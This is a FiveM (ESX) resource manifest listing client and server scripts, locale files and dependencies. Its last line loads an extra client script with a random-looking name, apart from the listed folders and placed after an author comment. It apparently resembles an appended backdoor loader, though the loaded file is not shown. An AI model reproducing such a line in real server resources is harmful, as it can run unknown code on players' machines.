resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
lua54 'yes'

client_scripts {
	'@es_extended/locale.lua',
	'locates/en.lua',
	'locates/pl.lua',
    'client/client.lua',
    'config.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
	'locates/en.lua',
	'locates/pl.lua',
	'server/server.lua',
	'config.lua'
}

dependencies {
	'cron'
}
-- skrypt zrobiony przez fluxika kisko i lowki B)
client_script "szymczakof_XxWMKWovjdkI.lua"